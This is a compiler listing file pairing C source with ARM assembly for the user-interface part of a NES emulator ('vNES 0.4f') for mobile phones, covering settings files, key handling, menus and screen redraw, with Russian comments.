##############################################################################
#                                                                            #
# IAR ARM ANSI C/C++ Compiler V4.42A/W32 EVALUATION    21/Apr/2011  22:57:17 #
# Copyright 1999-2005 IAR Systems. All rights reserved.                      #
#                                                                            #
#    Cpu mode        =  interwork                                            #
#    Endian          =  little                                               #
#    Stack alignment =  4                                                    #
#    Source file     =  C:\arm\vNes_snd\MAIN.C                               #
#    Command line    =  C:\arm\vNes_snd\MAIN.C -D NDEBUG -lCN                #
#                       C:\arm\vNes_snd\Release\List\ -lA                    #
#                       C:\arm\vNes_snd\Release\List\ -o                     #
#                       C:\arm\vNes_snd\Release\Obj\ -s9 --cpu_mode arm      #
#                       --endian little --cpu ARM926EJ-S --stack_align 4     #
#                       --interwork -e --fpu None --dlib_config              #
#                       "C:\arm2\Embedded Workbench 4.0                      #
#                       Evaluation\ARM\LIB\dl5tpainl8f.h" -I                 #
#                       "C:\arm2\Embedded Workbench 4.0                      #
#                       Evaluation\ARM\INC\" --inline_threshold=2            #
#    List file       =  C:\arm\vNes_snd\Release\List\MAIN.lst                #
#    Object file     =  C:\arm\vNes_snd\Release\Obj\MAIN.r79                 #
#                                                                            #
#                                                                            #
##############################################################################

C:\arm\vNes_snd\MAIN.C
      1          
      2          // vNES с вирусом!
      3          
      4          #include "menu.h"

   \                                 In segment DATA_I, align 4, align-sorted
   \   char __data zfont[769]
   \                     zfont:
   \   00000000                      DS8 772
   \   00000304                      REQUIRE `?<Initializer for zfont>`

   \                                 In segment DATA_Z, align 4, align-sorted
   \   char *__data file
   \                     file:
   \   00000000                      DS8 4

   \                                 In segment DATA_Z, align 4, align-sorted
   \   byte *__data redefineptr
   \                     redefineptr:
   \   00000000                      DS8 4

   \                                 In segment CODE, align 4, keep-with-next
   \   __??Code32?? __code __interwork __atpcs void keyboard_init()
   \                     keyboard_init:
   \   00000000   10402DE9           PUSH     {R4,LR}
   \   00000004   ........           LDR      R4,??DataTable46  ;; param
   \   00000008   2020A0E3           MOV      R2,#+32
   \   0000000C   0010A0E3           MOV      R1,#+0
   \   00000010   800084E2           ADD      R0,R4,#+128
   \   00000014   BB0000EF           SWI      +187
   \   00000018   2020A0E3           MOV      R2,#+32
   \   0000001C   0010A0E3           MOV      R1,#+0
   \   00000020   E00084E2           ADD      R0,R4,#+224
   \   00000024   BB0000EF           SWI      +187
   \   00000028   1080BDE8           POP      {R4,PC}          ;; return

   \                                 In segment CODE, align 4, keep-with-next
   \   __??Code32?? __code __interwork __atpcs void drawsym(short *, char)
   \                     drawsym:
   \   00000000   70209FE5           LDR      R2,??drawsym_0   ;; zfont
   \   00000004   30002DE9           PUSH     {R4,R5}
   \   00000008   E01081E2           ADD      R1,R1,#+224
   \   0000000C   011CB0E1           LSLS     R1,R1,#+24
   \   00000010   0010A003           MOVEQ    R1,#+0
   \   00000014   A11AA011           LSRNE    R1,R1,#+21
   \   00000018   021081E0           ADD      R1,R1,R2
   \   0000001C   0020A0E3           MOV      R2,#+0
   \                     ??drawsym_1:
   \   00000020   ........           LDRB     R3,[R1], #+1
   \   00000024   00C0A0E3           MOV      R12,#+0
   \                     ??drawsym_2:
   \   00000028   0040A0E1           MOV      R4,R0
   \   0000002C   020084E2           ADD      R0,R4,#+2
   \   00000030   800013E3           TST      R3,#0x80
   \   00000034   0050E013           MVNNE    R5,#+0
   \   00000038   1F50A003           MOVEQ    R5,#+31
   \   0000003C   B050C4E1           STRH     R5,[R4, #+0]
   \   00000040   833CA0E1           LSL      R3,R3,#+25
   \   00000044   233CA0E1           LSR      R3,R3,#+24
   \   00000048   01C08CE2           ADD      R12,R12,#+1
   \   0000004C   08005CE3           CMP      R12,#+8
   \   00000050   F4FFFFBA           BLT      ??drawsym_2
   \   00000054   ........           LDR      R3,??DataTable36  ;; width
   \   00000058   012082E2           ADD      R2,R2,#+1
   \   0000005C   003093E5           LDR      R3,[R3, #+0]
   \   00000060   080052E3           CMP      R2,#+8
   \   00000064   830080E0           ADD      R0,R0,R3, LSL #+1
   \   00000068   100040E2           SUB      R0,R0,#+16
   \   0000006C   EBFFFFBA           BLT      ??drawsym_1
   \   00000070   3000BDE8           POP      {R4,R5}
   \   00000074   1EFF2FE1           BX       LR               ;; return
   \                     ??drawsym_0:
   \   00000078   ........           DC32     zfont

   \                                 In segment CODE, align 4, keep-with-next
   \   __??Code32?? __code __interwork __atpcs void drawhelp(char const *)
   \                     drawhelp:
   \   00000000   70402DE9           PUSH     {R4-R6,LR}
   \   00000004   0040A0E3           MOV      R4,#+0
   \   00000008   0050A0E3           MOV      R5,#+0
   \   0000000C   0460A0E1           MOV      R6,R4
   \   00000010   ........           BL       outmenu
   \   00000014   090000EA           B        ??drawhelp_0
   \                     ??drawhelp_1:
   \   00000018   ........           LDR      R3,??DataTable39  ;; screen
   \   0000001C   960000E0           MUL      R0,R6,R0
   \   00000020   003093E5           LDR      R3,[R3, #+0]
   \   00000024   1420A0E3           MOV      R2,#+20
   \   00000028   053283E0           ADD      R3,R3,R5, LSL #+4
   \   0000002C   923020E0           MLA      R0,R2,R0,R3
   \   00000030   015085E2           ADD      R5,R5,#+1
   \   00000034   080080E2           ADD      R0,R0,#+8
   \   00000038   ........           BL       drawsym
   \   0000003C   014084E2           ADD      R4,R4,#+1
   \                     ??drawhelp_0:
   \   00000040   ........           LDR      R0,??DataTable40  ;; param
   \   00000044   000084E0           ADD      R0,R4,R0
   \   00000048   1011D0E5           LDRB     R1,[R0, #+272]
   \   0000004C   000051E3           CMP      R1,#+0
   \   00000050   7080BD08           POPEQ    {R4-R6,PC}
   \   00000054   ........           LDR      R0,??DataTable36  ;; width
   \   00000058   0A0051E3           CMP      R1,#+10
   \   0000005C   000090E5           LDR      R0,[R0, #+0]
   \   00000060   0300000A           BEQ      ??drawhelp_2
   \   00000064   4021A0E1           ASR      R2,R0,#+2
   \   00000068   A22E80E0           ADD      R2,R0,R2, LSR #+29
   \   0000006C   C20155E1           CMP      R5,R2, ASR #+3
   \   00000070   010000BA           BLT      ??drawhelp_3
   \                     ??drawhelp_2:
   \   00000074   0050A0E3           MOV      R5,#+0
   \   00000078   016086E2           ADD      R6,R6,#+1
   \                     ??drawhelp_3:
   \   0000007C   ........           LDR      R2,??DataTable37  ;; height
   \   00000080   18309FE5           LDR      R3,??drawhelp_4  ;; 0x66666667
   \   00000084   002092E5           LDR      R2,[R2, #+0]
   \   00000088   93C2CEE0           SMULL    R12,LR,R3,R2
   \   0000008C   4EE1A0E1           ASR      LR,LR,#+2
   \   00000090   A22F8EE0           ADD      R2,LR,R2, LSR #+31
   \   00000094   020056E1           CMP      R6,R2
   \   00000098   DEFFFFBA           BLT      ??drawhelp_1
   \   0000009C   7080BDE8           POP      {R4-R6,PC}       ;; return
   \                     ??drawhelp_4:
   \   000000A0   67666666           DC32     0x66666667

   \                                 In segment CODE, align 4, keep-with-next
   \   __??Code32?? __code __interwork __atpcs int loadini()
   \                     loadini:
   \   00000000   70402DE9           PUSH     {R4-R6,LR}
   \   00000004   ........           LDR      R4,??DataTable46  ;; param
   \   00000008   04D04DE2           SUB      SP,SP,#+4
   \   0000000C   2650A0E3           MOV      R5,#+38
   \   00000010   0050C4E5           STRB     R5,[R4, #+0]
   \   00000014   846FA0E3           MOV      R6,#+528
   \   00000018   2E10A0E3           MOV      R1,#+46
   \   0000001C   040086E0           ADD      R0,R6,R4
   \   00000020   170100EF           SWI      +279
   \   00000024   ........           LDR      R1,??DataTable9  ;; `?<Constant ".ini">`
   \   00000028   1A0000EF           SWI      +26
   \   0000002C   0D30A0E1           MOV      R3,SP
   \   00000030   8020A0E3           MOV      R2,#+128
   \   00000034   801CA0E3           MOV      R1,#+32768
   \   00000038   040086E0           ADD      R0,R6,R4
   \   0000003C   0A0000EF           SWI      +10
   \   00000040   0060A0E1           MOV      R6,R0
   \   00000044   010076E3           CMN      R6,#+1
   \   00000048   0F00000A           BEQ      ??loadini_0
   \   0000004C   0D30A0E1           MOV      R3,SP
   \   00000050   0120A0E3           MOV      R2,#+1
   \   00000054   0410A0E1           MOV      R1,R4
   \   00000058   0B0000EF           SWI      +11
   \   0000005C   0000D4E5           LDRB     R0,[R4, #+0]
   \   00000060   260050E3           CMP      R0,#+38
   \   00000064   0050C415           STRBNE   R5,[R4, #+0]
   \   00000068   0400001A           BNE      ??loadini_1
   \   0000006C   0D30A0E1           MOV      R3,SP
   \   00000070   FF20A0E3           MOV      R2,#+255
   \   00000074   011084E2           ADD      R1,R4,#+1
   \   00000078   0600A0E1           MOV      R0,R6
   \   0000007C   0B0000EF           SWI      +11
   \                     ??loadini_1:
   \   00000080   0D10A0E1           MOV      R1,SP
   \   00000084   0600A0E1           MOV      R0,R6
   \   00000088   0D0000EF           SWI      +13
   \                     ??loadini_0:
   \   0000008C   ........           BL       keyboard_init
   \   00000090   0000A0E3           MOV      R0,#+0
   \   00000094   7280BDE8           POP      {R1,R4-R6,PC}    ;; return

   \                                 In segment CODE, align 4, keep-with-next
   \   __??Code32?? __code __interwork __atpcs int saveini()
   \                     saveini:
   \   00000000   30402DE9           PUSH     {R4,R5,LR}
   \   00000004   ........           LDR      R5,??DataTable46  ;; param
   \   00000008   04D04DE2           SUB      SP,SP,#+4
   \   0000000C   844FA0E3           MOV      R4,#+528
   \   00000010   2E10A0E3           MOV      R1,#+46
   \   00000014   050084E0           ADD      R0,R4,R5
   \   00000018   170100EF           SWI      +279
   \   0000001C   ........           LDR      R1,??DataTable9  ;; `?<Constant ".ini">`
   \   00000020   1A0000EF           SWI      +26
   \   00000024   0D30A0E1           MOV      R3,SP
   \   00000028   402FA0E3           MOV      R2,#+256
   \   0000002C   0110A0E3           MOV      R1,#+1
   \   00000030   831C81E3           ORR      R1,R1,#0x8300
   \   00000034   050084E0           ADD      R0,R4,R5
   \   00000038   0A0000EF           SWI      +10
   \   0000003C   0040A0E1           MOV      R4,R0
   \   00000040   010074E3           CMN      R4,#+1
   \   00000044   0100A003           MOVEQ    R0,#+1
   \   00000048   3280BD08           POPEQ    {R1,R4,R5,PC}
   \   0000004C   ........           BL       keyboard_init
   \   00000050   0D30A0E1           MOV      R3,SP
   \   00000054   402FA0E3           MOV      R2,#+256
   \   00000058   0510A0E1           MOV      R1,R5
   \   0000005C   0400A0E1           MOV      R0,R4
   \   00000060   0C0000EF           SWI      +12
   \   00000064   0D10A0E1           MOV      R1,SP
   \   00000068   0400A0E1           MOV      R0,R4
   \   0000006C   0D0000EF           SWI      +13
   \   00000070   0000A0E3           MOV      R0,#+0
   \   00000074   3280BDE8           POP      {R1,R4,R5,PC}    ;; return

   \                                 In segment CODE, align 4, keep-with-next
   \   __??Code32?? __code __interwork __atpcs int isFreeRam(char *, char *)
   \                     isFreeRam:
   \   00000000   ........           LDR      R0,??DataTable48  ;; EL71
   \   00000004   0000D0E5           LDRB     R0,[R0, #+0]
   \   00000008   000050E3           CMP      R0,#+0
   \   0000000C   0100A003           MOVEQ    R0,#+1
   \   00000010   1EFF2F01           BXEQ     LR
   \   00000014   0000A0E3           MOV      R0,#+0
   \   00000018   1EFF2FE1           BX       LR               ;; return

   \                                 In segment CODE, align 4, keep-with-next
   \   __??Code32?? __code __interwork __atpcs void keypress(unsigned char, int)
   \                     keypress:
   \   00000000   30402DE9           PUSH     {R4,R5,LR}
   \   00000004   ........           LDR      R4,??DataTable46  ;; param
   \   00000008   0150A0E1           MOV      R5,R1
   \   0000000C   0210D4E5           LDRB     R1,[R4, #+2]
   \   00000010   000051E3           CMP      R1,#+0
   \   00000014   A010A013           MOVNE    R1,#+160
   \   00000018   4010A003           MOVEQ    R1,#+64
   \   0000001C   042081E0           ADD      R2,R1,R4
   \   00000020   0010A0E1           MOV      R1,R0
   \   00000024   0200A0E1           MOV      R0,R2
   \   00000028   180000EF           SWI      +24
   \   0000002C   000050E3           CMP      R0,#+0
   \   00000030   3080BD08           POPEQ    {R4,R5,PC}
   \   00000034   0C1194E5           LDR      R1,[R4, #+268]
   \   00000038   2020D0E5           LDRB     R2,[R0, #+32]
   \   0000003C   000055E3           CMP      R5,#+0
   \   00000040   0300000A           BEQ      ??keypress_0
   \   00000044   011082E1           ORR      R1,R2,R1
   \   00000048   0C1184E5           STR      R1,[R4, #+268]
   \   0000004C   0110A0E3           MOV      R1,#+1
   \   00000050   020000EA           B        ??keypress_1
   \                     ??keypress_0:
   \   00000054   0210C1E1           BIC      R1,R1,R2
   \   00000058   0C1184E5           STR      R1,[R4, #+268]
   \   0000005C   0010A0E3           MOV      R1,#+0
   \                     ??keypress_1:
   \   00000060   4010C0E5           STRB     R1,[R0, #+64]
   \   00000064   3080BDE8           POP      {R4,R5,PC}       ;; return

   \                                 In segment DATA_Z, align 4, align-sorted
      5          int plus=0;
   \                     plus:
   \   00000000                      DS8 4
      6          extern void AudioTerminate();
      7          extern void AudioInit();
      8          extern void AudioStart();
      9          extern void NSF_Init();
     10          extern signed char Volume;
     11          
     12          extern short *screen; // Экран 132*176*2
     13          extern int screensize;
     14          
     15          extern unsigned short *screens;
     16          extern char d_boolean_static_fld; //save_flag
     17          extern char o_boolean_static_fld; //load flag (to romname)
     18          extern char v_boolean_static_fld;
     19          
     20          extern void freeall();
     21          extern void initnul();
     22          extern char loadrom(char *s) ;
     23          extern void run();
     24          extern unsigned char SGOLD2, C65, S75, EL71;
     25          extern int getWidth, getHeight, screen_length;
     26          
     27          extern int b_int_static_fld, L;
     28          extern int B; //масштаб???

   \                                 In segment DATA_Z, align 4, align-sorted
     29          long LastTmrVal;
   \                     LastTmrVal:
   \   00000000                      DS8 4
     30          const byte version=0x26;

   \                                 In segment DATA_Z, align 4, align-sorted
     31          int tmpsize;
   \                     tmpsize:
   \   00000000                      DS8 4
     32          extern int A; //frameskip=5
     33          //extern int k_int_static_fld; //joy from vNES
     34          //#define joy k_int_static_fld

   \                                 In segment CODE, align 4, keep-with-next
     35          void repaint(){
   \                     repaint:
   \   00000000   00402DE9           PUSH     {LR}
     36            
     37             //if((SysTimer()-LastTmrVal)<=(A*10))
     38                                      //{
     39                                                     REDRAW();  
   \   00000004   720100EF           SWI      +370
     40                                                    // LastTmrVal=LastTmrVal+40-A*10;  
     41                                      //}
     42                                      
     43                                      //LastTmrVal=LastTmrVal+A*10;  
     44            
     45              ;}
   \   00000008   0080BDE8           POP      {PC}             ;; return

   \                                 In segment DATA_C, align 4, align-sorted
   \   char const __data helpsel[12]
   \                     helpsel:
   \   00000000   2053656C6563       DC8 " Select key"
   \              74206B657900
     46          
     47          const char helpkey[]=" 1 A\n2 up\n3 B\n4 left\n5 start\n6 right\n7 AA\n8 down\n9 BB\n0 select\n* AB";
   \                     helpkey:
   \   0000000C   203120410A32       DC8 20H, 31H, 20H, 41H, 0AH, 32H, 20H, 75H
   \              2075        
   \   00000014   700A3320420A       DC8 70H, 0AH, 33H, 20H, 42H, 0AH, 34H, 20H
   \              3420        
   \   0000001C   6C6566740A35       DC8 6CH, 65H, 66H, 74H, 0AH, 35H, 20H, 73H
   \              2073        
   \   00000024   746172740A36       DC8 74H, 61H, 72H, 74H, 0AH, 36H, 20H, 72H
   \              2072        
   \   0000002C   696768740A37       DC8 69H, 67H, 68H, 74H, 0AH, 37H, 20H, 41H
   \              2041        
   \   00000034   410A3820646F       DC8 41H, 0AH, 38H, 20H, 64H, 6FH, 77H, 6EH
   \              776E        
   \   0000003C   0A392042420A       DC8 0AH, 39H, 20H, 42H, 42H, 0AH, 30H, 20H
   \              3020        
   \   00000044   73656C656374       DC8 73H, 65H, 6CH, 65H, 63H, 74H, 0AH, 2AH
   \              0A2A        
   \   0000004C   20414200           DC8 20H, 41H, 42H, 0

   \                                 In segment DATA_C, align 1, align-sorted
   \                     version:
   \   00000000   26                 DC8 38

   \                                 In segment DATA_I, align 4, align-sorted
     48          extern char t_boolean_static_fld;
     49          
     50          extern void DrawScreen(); // Функция перерисовки экрана
     51          void onredraw();
     52          
     53          char *Title="vNES 0.4f (c)bn";
     54          
     55          const char *errors[]={
     56            0,
     57            "Запустите .nes файл\0",
     58            "Unknown error\0",
     59            "Не могу открыть файл\0",
     60            "Не .Nes ром!\0",
     61            "Маппер не поддерживается.\0",
     62            "Неверный ром!\0"
     63          };
     64          
     65          char romname[256];
     66          byte param[paramlength]=
   \                     param:
   \   00000000                      DS8 256
   \   00000100                      REQUIRE `?<Initializer for param>`
   \   int __data mode
   \                     mode:
   \   00000100                      DS8 4
   \   00000104                      REQUIRE `?<Initializer for mode>`
   \   int volatile __data running
   \                     running:
   \   00000104                      DS8 4
   \   00000108                      REQUIRE `?<Initializer for running>`
   \   int volatile __data exit
   \                     exit:
   \   00000108                      DS8 4
   \   0000010C                      REQUIRE `?<Initializer for exit>`
   \   int __data joy
   \                     joy:
   \   0000010C                      DS8 4
   \   00000110                      REQUIRE `?<Initializer for joy>`
   \   char __data menu[256]
   \                     menu:
   \   00000110                      DS8 256
   \   00000210                      REQUIRE `?<Initializer for menu>`
   \   char __data filename[128]
   \                     filename:
   \   00000210                      DS8 128
   \   00000290                      REQUIRE `?<Initializer for filename>`
   \                     romname:
   \   00000290                      DS8 256
   \   00000390                      REQUIRE `?<Initializer for romname>`
     67          "\x26\x05\x00\x00\x00\x00\x84\xB0\x00\x00\x08\x00\x00\x00\x00\x00"
     68          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     69          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     70          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     71          "\x3D\x3E\x3B\x3C\x2A\x23\x34\x36\x32\x38\x35\x1A\x31\x33\x37\x39"
     72          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     73          "\x40\x80\x10\x20\x10\x20\x40\x80\x10\x20\x08\x01\x08\x04\x01\x02"
     74          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     75          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     76          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     77          "\x3D\x3E\x3B\x3C\x2A\x23\x34\x36\x32\x38\x35\x1A\x31\x33\x37\x39"
     78          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     79          "\x40\x80\x10\x20\x10\x20\x40\x80\x10\x20\x08\x01\x08\x04\x01\x02"
     80          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     81          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     82          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
     83          
     84          enum{ pwidth=6, pheight, poptimize, pfilter, pstep, screenx, screeny};
     85          
     86          char help[]=
   \                     help:
   \   00000390                      DS8 168
   \   00000438                      REQUIRE `?<Initializer for help>`

   \                                 In segment DATA_I, align 4, align-sorted
   \                     Title:
   \   00000000                      DS8 4
   \   00000004                      REQUIRE `?<Initializer for Title>`

   \                                 In segment DATA_I, align 4, align-sorted
   \                     errors:
   \   00000000                      DS8 28
   \   0000001C                      REQUIRE `?<Initializer for errors>`
     87          " vNES 0.4f (c)bn"
     88          "\n1.Load 0-9"
     89          "\n2.Save 0-9"
     90          "\n3.FrmSkp 1-9:%d"
     91          "\n4.Optimize:%d"
     92          "\n5.Redefine"
     93          "\n6.Quality:%d"
     94          "\n7.ScrStep:%02d"
     95          "\n8.SizeX:%03d"
     96          "\n9.SizeY:%03d"
     97          "\n0.Exit"
     98          "\ncbn.narod.ru"
     99          "\ncbn@yandex.ru";
    100          
    101          

   \                                 In segment CODE, align 4, keep-with-next
    102          void outmenu(const char *help){
    103            sprintf(menu,help,param[pframeskip],t_boolean_static_fld,param[pfilter],param[pstep],getWidth, getHeight);//,param[pslow]);//,buf[stwidth],buf[stheight],buf[speed],buf[free],buf[fill],buf[lorec]|(buf[hirec]<<8));
   \                     outmenu:
   \   00000000   ........           LDR      R2,??DataTable43  ;; getHeight
   \   00000004   00402DE9           PUSH     {LR}
   \   00000008   002092E5           LDR      R2,[R2, #+0]
   \   0000000C   0010A0E1           MOV      R1,R0
   \   00000010   ........           LDR      R0,??DataTable46  ;; param
   \   00000014   04002DE9           PUSH     {R2}
   \   00000018   ........           LDR      R2,??DataTable42  ;; getWidth
   \   0000001C   002092E5           LDR      R2,[R2, #+0]
   \   00000020   04002DE9           PUSH     {R2}
   \   00000024   0A20D0E5           LDRB     R2,[R0, #+10]
   \   00000028   04002DE9           PUSH     {R2}
   \   0000002C   0920D0E5           LDRB     R2,[R0, #+9]
   \   00000030   04002DE9           PUSH     {R2}
   \   00000034   ........           LDR      R2,??DataTable50  ;; t_boolean_static_fld
   \   00000038   0030D2E5           LDRB     R3,[R2, #+0]
   \   0000003C   0120D0E5           LDRB     R2,[R0, #+1]
   \   00000040   440F80E2           ADD      R0,R0,#+272
   \   00000044   160000EF           SWI      +22
    104          }
   \   00000048   0F80BDE8           POP      {R0-R3,PC}       ;; return
    105          
    106          //void redEL(){
    107          //  int i,j,k;
    108          //  int r,g,b;
    109          //  short *ss=screen;
    110          //  int *s=screens;//main_a_...
    111          //  for(j=0;j<240*240;j++){
    112          ////    for(i=0;i<240;i++){
    113          //      k=*s++;
    114          //      *ss++=((k&0xf80000)>>8)|((k&0xfc00)>>5)|((k&0xf8)>>3);
    115          ////    }
    116          //  }
    117          //}
    118          
    119          //int screenx=0, screeny=0;
    120          

   \                                 In segment CODE, align 4, keep-with-next
    121          void onredslow(){
    122            int j,k,l;
    123            short *s, *ss;
    124            cls();
   \                     onredslow:
   \   00000000   ........           LDR      R0,??DataTable38  ;; screensize
   \   00000004   F0472DE9           PUSH     {R4-R10,LR}
   \   00000008   ........           LDR      R4,??DataTable39  ;; screen
   \   0000000C   000090E5           LDR      R0,[R0, #+0]
    125            if(l=(((C65?130:height)-getHeight)>>1)<0) l=0;
    126            if(k=((width-getWidth)>>1)<0) k=0;
    127            ss=screen+l*width+k;
    128              l=(getWidth>width)?width:getWidth;
   \   00000010   ........           LDR      R5,??DataTable42  ;; getWidth
   \   00000014   4021A0E1           ASR      R2,R0,#+2
   \   00000018   000094E5           LDR      R0,[R4, #+0]
   \   0000001C   ........           LDR      R6,??DataTable36  ;; width
   \   00000020   0010A0E3           MOV      R1,#+0
   \   00000024   ........           _BLF     memsetd,??memsetd??rA
    129              k=(getHeight>height)?height:getHeight;
   \   00000028   ........           LDR      R0,??DataTable43  ;; getHeight
   \   0000002C   001095E5           LDR      R1,[R5, #+0]
   \   00000030   008090E5           LDR      R8,[R0, #+0]
   \   00000034   ........           LDR      R0,??DataTable37  ;; height
   \   00000038   007096E5           LDR      R7,[R6, #+0]
   \   0000003C   000090E5           LDR      R0,[R0, #+0]
   \   00000040   004094E5           LDR      R4,[R4, #+0]
   \   00000044   010057E1           CMP      R7,R1
   \   00000048   0170A0A1           MOVGE    R7,R1
   \   0000004C   080050E1           CMP      R0,R8
   \   00000050   0080A0B1           MOVLT    R8,R0
    130              s=(short*)screens+param[screenx]+param[screeny]*getWidth;
   \   00000054   ........           LDR      R0,??DataTable46  ;; param
    131              for(j=0;j<k;j++){
   \   00000058   00A0A0E3           MOV      R10,#+0
   \   0000005C   0C20D0E5           LDRB     R2,[R0, #+12]
   \   00000060   0B00D0E5           LDRB     R0,[R0, #+11]
   \   00000064   010058E3           CMP      R8,#+1
   \   00000068   910202E0           MUL      R2,R1,R2
   \   0000006C   ........           LDR      R1,??DataTable25  ;; screens
   \   00000070   001091E5           LDR      R1,[R1, #+0]
   \   00000074   800081E0           ADD      R0,R1,R0, LSL #+1
   \   00000078   829080E0           ADD      R9,R0,R2, LSL #+1
   \   0000007C   090000AA           BGE      ??onredslow_0
   \   00000080   F087BDE8           POP      {R4-R10,PC}
    132                movsw(ss,s,l);
   \                     ??onredslow_1:
   \   00000084   0720A0E1           MOV      R2,R7
   \   00000088   0910A0E1           MOV      R1,R9
   \   0000008C   0400A0E1           MOV      R0,R4
   \   00000090   ........           _BLF     movsw,??movsw??rA
    133                ss+=width;
   \   00000094   000096E5           LDR      R0,[R6, #+0]
    134                s+=getWidth;
    135              }
   \   00000098   01A08AE2           ADD      R10,R10,#+1
   \   0000009C   804084E0           ADD      R4,R4,R0, LSL #+1
   \   000000A0   000095E5           LDR      R0,[R5, #+0]
   \   000000A4   809089E0           ADD      R9,R9,R0, LSL #+1
   \                     ??onredslow_0:
   \   000000A8   08005AE1           CMP      R10,R8
   \   000000AC   F4FFFFBA           BLT      ??onredslow_1
    136          }
   \   000000B0   F087BDE8           POP      {R4-R10,PC}      ;; return
    137          
    138          extern void filter2(void *to, void *from);
    139          extern void filter(void *to, void *from);
    140          

   \                                 In segment CODE, align 4, keep-with-next
    141          void onredraw(){ // Перерисовка экрана screen[132*176]
    142            if(param[pfilter] && !EL71){ if(C65) filter(screen,screens); else filter2(screen,screens);//!!!!!2
   \                     onredraw:
   \   00000000   ........           LDR      R0,??DataTable39  ;; screen
   \   00000004   ........           LDR      R1,??DataTable25  ;; screens
   \   00000008   ........           LDR      R2,??DataTable48  ;; EL71
   \   0000000C   10402DE9           PUSH     {R4,LR}
   \   00000010   000090E5           LDR      R0,[R0, #+0]
   \   00000014   001091E5           LDR      R1,[R1, #+0]
   \   00000018   ........           LDR      R4,??DataTable46  ;; param
   \   0000001C   0020D2E5           LDRB     R2,[R2, #+0]
   \   00000020   0930D4E5           LDRB     R3,[R4, #+9]
   \   00000024   000053E3           CMP      R3,#+0
   \   00000028   0900000A           BEQ      ??onredraw_0
   \   0000002C   000052E3           CMP      R2,#+0
   \   00000030   0700001A           BNE      ??onredraw_0
   \   00000034   ........           LDR      R2,??DataTable47  ;; C65
   \   00000038   0020D2E5           LDRB     R2,[R2, #+0]
   \   0000003C   000052E3           CMP      R2,#+0
   \   00000040   0100000A           BEQ      ??onredraw_1
   \   00000044   ........           _BLF     filter,??filter??rA
   \   00000048   150000EA           B        ??onredraw_2
   \                     ??onredraw_1:
   \   0000004C   ........           _BLF     filter2,??filter2??rA
   \   00000050   130000EA           B        ??onredraw_2
    143            }else
    144            if(getWidth==width && getHeight==height)
   \                     ??onredraw_0:
   \   00000054   ........           LDR      R3,??DataTable42  ;; getWidth
   \   00000058   ........           LDR      R12,??DataTable36  ;; width
   \   0000005C   003093E5           LDR      R3,[R3, #+0]
   \   00000060   00C09CE5           LDR      R12,[R12, #+0]
   \   00000064   0C0053E1           CMP      R3,R12
   \   00000068   0C00001A           BNE      ??onredraw_3
   \   0000006C   ........           LDR      R3,??DataTable43  ;; getHeight
   \   00000070   ........           LDR      R12,??DataTable37  ;; height
   \   00000074   003093E5           LDR      R3,[R3, #+0]
   \   00000078   00C09CE5           LDR      R12,[R12, #+0]
   \   0000007C   0C0053E1           CMP      R3,R12
   \   00000080   0600001A           BNE      ??onredraw_3
    145              movsd(screen,screens,EL71?(255*240/2):(132*176/2));
   \   00000084   000052E3           CMP      R2,#+0
   \   00000088   8820A013           MOVNE    R2,#+136
   \   0000008C   772C8213           ORRNE    R2,R2,#0x7700
   \   00000090   6020A003           MOVEQ    R2,#+96
   \   00000094   B42D8203           ORREQ    R2,R2,#0x2D00
   \   00000098   ........           _BLF     movsd,??movsd??rA
   \   0000009C   000000EA           B        ??onredraw_2
    146            else onredslow();
   \                     ??onredraw_3:
   \   000000A0   ........           BL       onredslow
    147            if(mode) drawhelp((mode==99)?helpsel:((mode==98)?helpkey:help));
   \                     ??onredraw_2:
   \   000000A4   001194E5           LDR      R1,[R4, #+256]
   \   000000A8   000051E3           CMP      R1,#+0
   \   000000AC   1080BD08           POPEQ    {R4,PC}
   \   000000B0   18009FE5           LDR      R0,??onredraw_4  ;; helpsel
   \   000000B4   630051E3           CMP      R1,#+99
   \   000000B8   0200000A           BEQ      ??onredraw_5
   \   000000BC   620051E3           CMP      R1,#+98
   \   000000C0   0C008002           ADDEQ    R0,R0,#+12
   \   000000C4   E40F8412           ADDNE    R0,R4,#+912
   \                     ??onredraw_5:
   \   000000C8   ........           BL       drawhelp
    148          }
   \   000000CC   1080BDE8           POP      {R4,PC}          ;; return
   \                     ??onredraw_4:
   \   000000D0   ........           DC32     helpsel
    149            //  extern void redraw(short *screen, int *from, int size);
    150          //  extern void filter(short *screen, int *from);
    151          // if(!c65) 
    152          //  redraw(screen, screens, (EL71)?(240*240):(132*176));
    153          // else  filter(screen, screens);
    154          /*  int i,j,k;
    155            int r,g,b;
    156            short *ss=screen;
    157            int *s=screens;//main_a_...
    158            for(j=0;j<176;j++){
    159              for(i=0;i<132;i++){
    160                k=*s++;
    161                //r=(k>>16)&0xff;
    162                //g=(k>>8)&0xff;
    163                //b=(k)&0xff;
    164                *ss++=((k&0xf80000)>>8)|((k&0xfc00)>>5)|((k&0xf8)>>3);
    165                  //(r>>3<<11)|(g>>2<<5)|(b>>3);
    166              }
    167              //s+=256-132;
    168            }
    169          */
    170          //  int i,j;
    171          //  for(i=0,j=color++;i<132*176;i++){
    172          //    screen[i]=j++;
    173          //  }
    174          //}
    175          

   \                                 In segment CODE, align 4, keep-with-next
    176          void getscrXY(){ //помен. размеры экрана max 256 240
    177            //int x,y;
    178          //  if(param[protate]){ x=height; y=width;}
    179            //else {}
    180            //x=width; y=height;
    181            if(!(getWidth=param[pwidth])) getWidth=256;
   \                     getscrXY:
   \   00000000   ........           LDR      R0,??DataTable46  ;; param
   \   00000004   30402DE9           PUSH     {R4,R5,LR}
   \   00000008   0610D0E5           LDRB     R1,[R0, #+6]
